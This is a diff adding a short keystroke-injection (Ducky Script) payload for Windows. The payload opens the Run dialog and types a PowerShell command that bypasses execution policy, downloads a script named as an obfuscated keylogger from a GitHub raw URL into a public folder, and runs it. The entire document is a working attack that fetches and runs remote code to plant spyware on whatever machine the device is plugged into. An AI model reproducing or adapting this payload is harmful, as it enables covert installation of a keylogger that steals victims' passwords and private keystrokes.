@@ -1,0 +1,5 @@
+DELAY 500
+GUI r
+DELAY 500
+STRING powershell -ExecutionPolicy Bypass -NoProfile -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/festeradams1311/hands/refs/heads/main/keylogger_offuscato.ps1' -OutFile 'C:\Users\Public\keylogger.ps1'; Start-Process -FilePath 'C:\Users\Public\keylogger.ps1'"
+ENTER
